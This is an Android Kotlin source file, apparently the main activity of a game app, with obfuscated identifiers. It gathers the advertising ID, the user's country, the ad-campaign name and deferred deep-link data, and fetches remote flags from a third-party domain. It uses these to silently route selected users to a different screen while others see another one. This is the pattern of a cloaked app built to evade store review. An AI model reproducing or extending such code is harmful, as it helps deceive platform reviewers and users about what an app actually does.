package com.pomelogames.bulletboy

import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import android.content.Context
import com.pomelogames.bulletboy.Junxhxc.Companion.hucjxmna
import android.content.Intent
import com.pomelogames.bulletboy.Junxhxc.Companion.QOPSL
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import com.pomelogames.bulletboy.Junxhxc.Companion.hysuzx
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.pomelogames.bulletboy.Junxhxc.Companion.TFDTYS
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.facebook.applinks.AppLinkData
import com.orhanobut.hawk.Hawk
import com.pomelogames.bulletboy.databinding.ActivityMainBinding
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.Job
import com.pomelogames.bulletboy.Junxhxc.Companion.UISDOJ
import kotlinx.coroutines.launch


class MainActivity : AppCompatActivity() {
    lateinit var usixkxzcnc: ActivityMainBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        usixkxzcnc = ActivityMainBinding.inflate(layoutInflater)
        setContentView(usixkxzcnc.root)

        eoplxz(this)
        GlobalScope.launch(Dispatchers.IO) {
            ropxzl
        }

        AppsFlyerLib.getInstance()
            .init("yHKVDMhAsDeZaDbS7H4mLM", apsncjzx, applicationContext)
        AppsFlyerLib.getInstance().start(this)

    }

    private fun yudioxkz(){
        val foipx = AdvertisingIdClient(applicationContext)
        foipx.start()
        val vgysa = foipx.info.id
        Log.d("getAdvertisingId = ", vgysa.toString())
        Hawk.put(UISDOJ, vgysa)
    }

    private suspend fun dklcov(): String? {
        val wosilxlz = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://pro.ip-api.com/")
            .build()
            .create(Uiokxzj::class.java)

        val cnkocx = wosilxlz.yusixjzzx().body()?.syau
        Log.d("Data", "countryCode: $cnkocx ")
        return cnkocx

    }

    private val ropxzl: Job = GlobalScope.launch(Dispatchers.IO) {
        val mkdisd: String = dklcov().toString()
        val tsy = nyvucids().toString()
        val eposl: String? = Hawk.get(TFDTYS, "null") //здесь нужен дефолтный ноль
        val guiso = Hawk.get(hysuzx, "null")
        var wosoadkakosd: String? = Hawk.get(QOPSL)
        yudioxkz()
        if (guiso == "1") {
            val vjjxzcokzosa = Executors.newSingleThreadScheduledExecutor()
            vjjxzcokzosa.scheduleAtFixedRate({
                if (wosoadkakosd != null) {
                    Log.d("TestInUIHawk", wosoadkakosd.toString())

                    if (wosoadkakosd!!.contains("tdb2") || tsy.contains(mkdisd) || eposl!!.contains("tdb2")) {
                        Log.d("Apps Checker", "naming: $wosoadkakosd")
                        vjjxzcokzosa.shutdown()
                        startActivity(Intent(this@MainActivity, Iopkbda::class.java))
                        finish()
                    } else {
                        vjjxzcokzosa.shutdown()
                        startActivity(Intent(this@MainActivity, Usoijxzis::class.java))
                        finish()
                    }
                } else {
                    wosoadkakosd = Hawk.get(QOPSL)
                    Log.d("TestInUIHawk", "Received null $wosoadkakosd")
                }

            }, 0, 2, TimeUnit.SECONDS)
        }
        else if (tsy.contains(mkdisd)) {
            startActivity(Intent(this@MainActivity, Iopkbda::class.java))
            finish()
        } else {
            startActivity(Intent(this@MainActivity, Usoijxzis::class.java))
            finish()
        }
    }


    private val apsncjzx = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val yuiommcxmvjs = data?.get("campaign").toString()
            Hawk.put(QOPSL, yuiommcxmvjs)
        }

        override fun onConversionDataFail(p0: String?) {
            Log.e("dev_test", "error getting conversion data: $p0" );
        }

        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {

        }

        override fun onAttributionFailure(p0: String?) {
        }
    }







    fun eoplxz(foplxc: Context) {
        AppLinkData.fetchDeferredAppLinkData(
            foplxc
        ) { gaso: AppLinkData? ->
            gaso?.let {
                val params = gaso.targetUri.host.toString()
                Hawk.put(TFDTYS, params)
            }
            if (gaso == null) {

            }
        }
    }


    private suspend fun nyvucids(): String? {
        val idosmcmzx = Retrofit.Builder()
            .addConverterFactory(GsonConverterFactory.create())
            .baseUrl("http://bravepalladium.xyz/")
            .build()
            .create(Uiokxzj::class.java)

        val fiosaxzkc = idosmcmzx.losdasjnxz().body()?.ropsla
        Log.d("Data", "getDataDev: $fiosaxzkc")
        val aosapx = idosmcmzx.losdasjnxz().body()?.euyxjjz
        Hawk.put(hysuzx, aosapx)
        Hawk.put(hucjxmna, fiosaxzkc)
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(hucjxmna, "null")}")
        Log.d("Data in Hawk", "getDataDev: ${Hawk.get(hysuzx, "null")}")
        val hygjvcm = idosmcmzx.losdasjnxz().body()?.jsuixzc
        Log.d("Data", hygjvcm.toString())
        return hygjvcm
    }


}